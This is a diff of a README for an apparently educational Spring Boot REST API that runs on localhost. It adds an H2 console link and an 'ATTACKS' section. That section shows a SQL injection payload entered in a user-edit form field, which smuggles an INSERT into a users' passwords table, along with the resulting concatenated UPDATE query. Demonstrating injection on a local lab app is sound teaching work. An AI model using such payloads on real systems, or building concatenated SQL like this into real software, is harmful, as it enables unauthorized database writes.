@@ -5,6 +5,9 @@ REST API
 ##To start use
 http://localhost:8084/
 
+@@H2 console
+http://localhost:8084/h2-console
+
 
 ##Thanks to FreeMarker tutorial
 http://zetcode.com/springboot/freemarker/
@@ -32,3 +35,21 @@ https://www.baeldung.com/spring-httpmessageconverter-rest
 
 
 
+#Exam
+5
+http://www.k-press.ru/cs/2009/1/ts/ts.asp
+
+
+
+
+***************************************************************************************
+*****************************          ATTACKS             *******************************
+***************************************************************************************
+# SQL injections attacks
+Attack vector: http://localhost:8084/editUser?userId=1
+Field: any text field - i.e. Phone Operator
+';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --
+
+
+Resulting SQL _____________________________________________________________________**********************************************************************************_____________________________
+UPDATE users SET  name = 'Ivan', phoneNumber = '233234234', phoneOperator = 'Orange';  INSERT INTO usersPasswords(name, password) VALUES('Leo333', '333Password'); --', balance = 43200 WHERE id=1;
